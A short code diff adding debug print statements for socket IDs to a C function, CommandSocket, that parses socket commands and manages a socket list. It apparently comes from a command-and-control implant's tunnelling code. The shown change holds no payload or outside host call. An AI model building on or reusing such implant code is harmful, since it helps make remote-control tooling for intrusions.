@@ -2679,6 +2679,7 @@ VOID CommandSocket( PPARSER Parser )
             SocketID    = ParserGetInt32( Parser );
             Data.Buffer = ParserGetBytes( Parser, &Data.Length );
 
+            PRINTF( "Socket ID: %x\n", SocketID )
             PRINTF( "Data[%d]: %p\n", Data.Length, Data.Buffer )
 
             /* get Sockets list */
@@ -2722,6 +2723,8 @@ VOID CommandSocket( PPARSER Parser )
             Addr = ParserGetInt32( Parser );
             Host = ParserGetBytes( Parser, NULL );
 
+            PRINTF( "Socket ID: %x\n", ScId )
+
             /* check if its 0.0.0.1
              * if it's an addr then query for the host.
              * if not the use the addr to connect */
@@ -2756,6 +2759,8 @@ VOID CommandSocket( PPARSER Parser )
 
             /* parse arguments */
             SocketID = ParserGetInt32( Parser );
+
+            PRINTF( "SocketID: %x\n", SocketID );
 
             /* get Sockets list */
             Socket = Instance.Sockets;
